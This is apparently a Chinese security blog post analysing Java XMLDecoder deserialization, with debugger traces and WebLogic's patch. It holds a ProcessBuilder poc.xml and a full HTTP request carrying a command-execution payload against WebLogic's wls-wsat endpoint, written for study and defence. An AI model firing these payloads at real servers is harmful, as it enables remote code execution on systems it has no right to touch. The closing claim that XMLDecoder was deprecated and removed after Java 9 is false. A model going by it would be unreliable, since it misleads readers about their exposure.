# JAVA安全之XMLDecoder反序列化分析研究-先知社区

> **来源**: https://xz.aliyun.com/news/17479  
> **文章ID**: 17479

---

#### 文章前言

Java中的XMLDecoder是java.beans包提供的一个用于将XML数据反序列化为Java对象的工具类，它常被用于将符合Java Beans规范的类与XML格式数据进行转换，但其设计特性也导致了严重的安全漏洞，本篇文章主要介绍XMLDecoder的工作原理和机制以及对反序列化漏洞的成因进行详细刨析

​

#### 基础知识

java.beans.XMLDecoder是JDK自带的以SAX方式解析XML的类，其主要功能是实现JAVA对象和XML文件之间的转化：

##### 序列化操作

简易测试类——MyClass.java

​

```
package org.example;

public class MyClass {

    private String name;
    private int value;

    // Getter 和 Setter 方法
    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getValue() {
        return value;
    }

    public void setValue(int value) {
        this.value = value;
    }
}
```

​

序列化类——XmlEncoderExample.java

```
package org.example;

import java.beans.XMLEncoder;
import java.io.FileOutputStream;
import java.io.IOException;

public class XmlEncoderExample {
    public static void main(String[] args) {
        MyClass myObject = new MyClass();
        myObject.setName("Al1ex");
        myObject.setValue(42);

        try (FileOutputStream fos = new FileOutputStream("object.xml");
             XMLEncoder encoder = new XMLEncoder(fos)) {
            // 使用XMLEncoder将对象写入 XML 文件
            encoder.writeObject(myObject);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

​

序列化操作结果如下，可以看到这里是将新创建的MyClass对象赋值后写入了object.xml文件中，其中的class代表具体的类名，property则是属性

​

![image.png](images/img_17479_000.png)

##### 反序列化操作

随后我们写一个类并对上面的object.xml文件进行反序列化操作

```
package org.example;

import java.beans.XMLDecoder;
import java.io.FileInputStream;
import java.io.IOException;

public class XmlDecoderExample {
    public static void main(String[] args) {
        try (FileInputStream fis = new FileInputStream("object.xml");
             XMLDecoder decoder = new XMLDecoder(fis)) {

            // 从 XML 文件中反序列化对象
            MyClass myObject = (MyClass) decoder.readObject();

            // 输出反序列化后的对象内容
            System.out.println("Name: " + myObject.getName());
            System.out.println("Value: " + myObject.getValue());

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

​

执行结果如下：

​

![image.png](images/img_17479_001.png)

#### **漏洞原理**

JAVA中的XMLDecoder反序列化漏洞产生的原因主要是由于在使用XMLDecoder进行数据反序列化时，缺乏对输入数据的充分验证和过滤，攻击者可以构造恶意的XML数据(例如：XML数据中包含不安全的类或者通过反射调用一些危险的方法)，在反序列化过程执行任意代码(其实最底层是表达式的解析)

#### 调试分析

首先我们构造一个恶意的poc.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<java class="java.beans.XMLDecoder">
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="2">
      <void index="0">
        <string>cmd</string>
      </void>
      <void index="1">
        <string>/c calc</string>
      </void>
    </array>
    <void method="start"/>
  </object>
</java>
```

​

使用XMLDecoder解析poc.xml

![image.png](images/img_17479_002.png)

随后我们在在readObject()处设置断点进行调试分析

![image.png](images/img_17479_003.png)

随后继续跟进可以看到这里调用了parsingComplete()方法，继续跟进其中一探究竟

![image.png](images/img_17479_004.png)

​

在这里调用了XMLDecoder.this.handler.parse()，从调试界面中可以看到这里的this.handler其实就是DocumentHandler，说白了这里的parser也就是调用DocumentHandler.parser进行的xml文件的解析操作

​

![image.png](images/img_17479_005.png)

随后跟进这里的parser解析操作，可以看到这里DocumentHandler.parser()中调用了如下函数来解析XML内容：

```
SAXParserFactory.newInstance().newSAXParser().parse()
```

![image.png](images/img_17479_006.png)

这里我们直接步步跟进到parse中去，可以看到这里首先设置了解析时的各类handler(例如：XML内容处理、实体解析处理、粗欧文处理、DTD文档类型处理、文件等句柄)，最后才是调用xmlReader.parser(is)来进行的XML文件解析操作：

​

![image.png](images/img_17479_007.png)

调用父类的parser()函数进行解析

​

![image.png](images/img_17479_008.png)

随后设置输入源字节流、字符流、设置输入源的编码格式以确保正确解析文件中的字符，然后进行xml的解析

![image.png](images/img_17479_009.png)

随后再调用XML11Configuration.parse()进行解析....这个层层累人.....

![image.png](images/img_17479_010.png)

随后进行xml的解析操作，例如：获取版本信息、重置扫描器的版本配置

​

![image.png](images/img_17479_011.png)

随后调用scanDocument()进行扫描

​

![image.png](images/img_17479_012.png)

​

随后执行do..while循环体，其中包括START\_DOCUMENT、START\_ELEMENT、CHARACTERS、SPACE、ENTITY\_REFERENCE、PROCESSING\_INSTRUCTION等扫描识别：

​

![image.png](images/img_17479_013.png)

​

这里的解析依赖于DocumentHandler类，而在DocumentHandler构造函数中为不同的标签定义了不同的handler，每个handler都以key-value的形式存储，每个标签可以通过节点名称来获取对应的handler来进行相应事件处理

C:\Program Files\Java\jdk1.8.0\_181\src.zip!\com\sun\org\apache\xerces\internal\impl\XMLDocumentFragmentScannerImpl.java

​

![image.png](images/img_17479_014.png)

​

其中需要多留意的是startElement和endElement会在每当遇到起始或终止标签时调用，在startElement方法中首先解析java标签，从构造方法中HashMap取出对应的值，然后设置Owner和Parent

​

![image.png](images/img_17479_015.png)

​

随后解析下一个object标签，拿到属性之后通过addAttribute设置属性

​

![image.png](images/img_17479_016.png)

​

随后在addAttribute中调用了父类的addAttribute方法

​

![image.png](images/img_17479_017.png)

​

然后通过反射的方式生成了java.lang.ProcessBuilderClass对象

​

![image.png](images/img_17479_018.png)

​

赋值完之后跳出循环进入this.handler.startElement就这样依次解析下面的标签

​

![image.png](images/img_17479_019.png)

​

解析完所有的开始标签之后进入到endElement开始解析闭合标签

​

![image.png](images/img_17479_020.png)

​

随后调用ElementHandler类的getValueObject获取标签内的value值

​

![image.png](images/img_17479_021.png)

最后调用来到ObjectElementhandler的getValueObject方法，可以看到变量var3和var4，分别为获取到ProcessBuilder类名和start方法名，再调用Expression的var5的getValue方法反射调用start触发命令执行

​

![image.png](images/img_17479_022.png)

​

调用栈如下所示：

​

```
getValueObject:123, NewElementHandler (com.sun.beans.decoder)
endElement:169, ElementHandler (com.sun.beans.decoder)
endElement:318, DocumentHandler (com.sun.beans.decoder)
endElement:609, AbstractSAXParser (com.sun.org.apache.xerces.internal.parsers)
emptyElement:183, AbstractXMLDocumentParser (com.sun.org.apache.xerces.internal.parsers)
scanStartElement:1339, XMLDocumentFragmentScannerImpl (com.sun.org.apache.xerces.internal.impl)
next:2784, XMLDocumentFragmentScannerImpl$FragmentContentDriver (com.sun.org.apache.xerces.internal.impl)
next:602, XMLDocumentScannerImpl (com.sun.org.apache.xerces.internal.impl)
scanDocument:505, XMLDocumentFragmentScannerImpl (com.sun.org.apache.xerces.internal.impl)
parse:842, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)
parse:771, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)
parse:141, XMLParser (com.sun.org.apache.xerces.internal.parsers)
parse:1213, AbstractSAXParser (com.sun.org.apache.xerces.internal.parsers)
parse:643, SAXParserImpl$JAXPSAXParser (com.sun.org.apache.xerces.internal.jaxp)
parse:327, SAXParserImpl (com.sun.org.apache.xerces.internal.jaxp)
run:375, DocumentHandler$1 (com.sun.beans.decoder)
run:372, DocumentHandler$1 (com.sun.beans.decoder)
doPrivileged:-1, AccessController (java.security)
doIntersectionPrivilege:74, ProtectionDomain$JavaSecurityAccessImpl (java.security)
parse:372, DocumentHandler (com.sun.beans.decoder)
run:201, XMLDecoder$1 (java.beans)
run:199, XMLDecoder$1 (java.beans)
doPrivileged:-1, AccessController (java.security)
parsingComplete:199, XMLDecoder (java.beans)
readObject:250, XMLDecoder (java.beans)
main:13, XMLDecoderExploit (org.example)
```

​

​

#### 漏洞案例

关于JAVA中的XMLDecode反序列化比较典型的就是"Weblogic XMLDecoder 反序列化漏洞"，下面做一个简单的分析演示，下面是测试载荷：

​

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.174.144:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 706

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> 
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java version="1.4.0" class="java.beans.XMLDecoder">
                <void class="java.lang.ProcessBuilder">
                    <array class="java.lang.String" length="1">
                        <void index="0">
                            <string>calc</string>
                        </void>
                    </array>
                    <void method="start"/>
                </void>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
```

​

![image.png](images/img_17479_023.png)

执行效果如下所示：

​

![image.png](images/img_17479_024.png)

从burp返回的xml数据中可以清晰看到调用栈，这里主要关注<ns2:frame />标签中class以weblogic开头的部分，该部分为weblogic处理请求的调用栈逻辑，整个调用栈大致如下(调用次序为从下至上)：

​

```
weblogic.wsee.jaxws.JAXWSServlet————>doRequest
weblogic.wsee.jaxws.HttpServletAdapter—————>post
weblogic.wsee.jaxws.HttpServletAdapter$3————>run
weblogic.wsee.util.ServerSecurityHelper————>authenticatedInvoke
weblogic.security.service.SecurityManager————>runAs
weblogic.security.acl.internal.AuthenticatedSubject—————>doAs
weblogic.wsee.jaxws.HttpServletAdapter$AuthorizedInvoke——>run
weblogic.wsee.jaxws.WLSServletAdapter————>handle
com.sun.xml.ws.transport.http.servlet.ServletAdapter————>ServletAdapter
com.sun.xml.ws.transport.http.HttpAdapter——————>handle
com.sun.xml.ws.server.WSEndpointImpl$2————>process
com.sun.xml.ws.api.pipe.Fiber————>__doRun、_doRun、doRun、runSync
weblogic.wsee.jaxws.workcontext.WorkContextServerTube——>processRequest
weblogic.wsee.jaxws.workcontext.WorkContextTube————>readHeaderOld
weblogic.wsee.jaxws.workcontext.WorkContextServerTube——>receive
weblogic.workarea.WorkContextMapImpl——>receiveRequest
weblogic.workarea.WorkContextLocalMap——>receiveRequest
weblogic.workarea.spi.WorkContextEntryImpl——>readEntry
weblogic.wsee.workarea.WorkContextXmlInputAdapter——>readUTF
```

​

我们在weblogic.wsee.jaxws.workcontext.WorkContextServerTube的processRequestch处理请求的方法处下断点进行调试：

​

![image.png](images/img_17479_025.png)

随后在burpsuite执行载荷可以在IDEA中看到成功命中，此时的var1变量的值即为构造的载荷：

​

![image.png](images/img_17479_026.png)

​

随后跟进readHeaderOld方法，在该方法中声明了XMLStreamReader的一个对象var2，然后通过调用var1.readHeader()方法将其复制给var2，之后创建了一个XMLStreamReaderToXMLStreamWriter对象var3以及一个ByteArrayOutputStream对象var4，之后调用XMLStreamWriterFactory.create(var4)并将其赋值给XMLStreamWriter的一个新的对象var5：

![image.png](images/img_17479_027.png)

​

在这里我们直接单步步过到WorkContextXmlInputAdapter(new ByteArrayInputStream(var4.toByteArray()));处：

​

![image.png](images/img_17479_028.png)

​

之后继续跟进，可以看到这里没有经过任何过滤就直接调用XMLDecoder方法，而XMLDecoder本身是用于将XML文件反序列成JAVA的对象，而这也是反序列化的根本原因：

![image.png](images/img_17479_029.png)

随后继续跟进receive中：

![image.png](images/img_17479_030.png)

​

继续跟进receiveRequest()：

​

![image.png](images/img_17479_031.png)

​

继续跟进：

![image.png](images/img_17479_032.png)

继续跟进后可以看到这里又去调用了readUTF()函数：

![image.png](images/img_17479_033.png)

随后可以看到在readUTF处执行了readObject方法，实现了对XMLDecode的反序列化操作，而其后续的调用分析就是我们上面"调试部分"的内容，这里不再赘述：

![image.png](images/img_17479_034.png)

Weblogic官方对于产品中的XMLDecoder问题修复方式如下：

在文件WorkContextXmlInputAdapter.java中，添加了validate()，在解析xml的过程中，如果qName值为Object就抛出异常，同时限制了object，new, method, void，array等关键字段，不能生成Java实例：

​

```
public WorkContextXmlInputAdapter(InputStream is)  {
    ByteArrayOutputStream baos = new ByteArrayOutputStream();    try
    {      int next = 0;
      next = is.read();      while (next != -1)
      {
        baos.write(next);
        next = is.read();
      }
    }    catch (Exception e)
    {      throw new IllegalStateException("Failed to get data from input stream", e);
    }
    validate(new ByteArrayInputStream(baos.toByteArray()));    this.xmlDecoder = new XMLDecoder(new ByteArrayInputStream(baos.toByteArray()));
  }  

private void validate(InputStream is) {
   WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
   try {
      SAXParser parser = factory.newSAXParser();
      parser.parse(is, new DefaultHandler() {
         private int overallarraylength = 0;
         public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
            if(qName.equalsIgnoreCase("object")) {
               throw new IllegalStateException("Invalid element qName:object");
            } else if(qName.equalsIgnoreCase("new")) {
               throw new IllegalStateException("Invalid element qName:new");
            } else if(qName.equalsIgnoreCase("method")) {
               throw new IllegalStateException("Invalid element qName:method");
            } else {
               if(qName.equalsIgnoreCase("void")) {
                  for(int attClass = 0; attClass < attributes.getLength(); ++attClass) {
                     if(!"index".equalsIgnoreCase(attributes.getQName(attClass))) {
                        throw new IllegalStateException("Invalid attribute for element void:" + attributes.getQName(attClass));
                     }
                  }
               }
               if(qName.equalsIgnoreCase("array")) {
                  String var9 = attributes.getValue("class");
                  if(var9 != null && !var9.equalsIgnoreCase("byte")) {
                     throw new IllegalStateException("The value of class attribute is not valid for array element.");
                  }

......

```

​

#### 防御措施

从Java 9开始，XMLDecoder已经被标记为过时(deprecated)并且在后续版本中被完全移除，可以通过升级JDK强制规避由于使用XMLDecoder反序列化XML内容导致的反序列化问题，如果一定要使用则尽量确保参数不可由外界输入，同时以白名单的方式限定XML文档名且结合严格的过滤机制
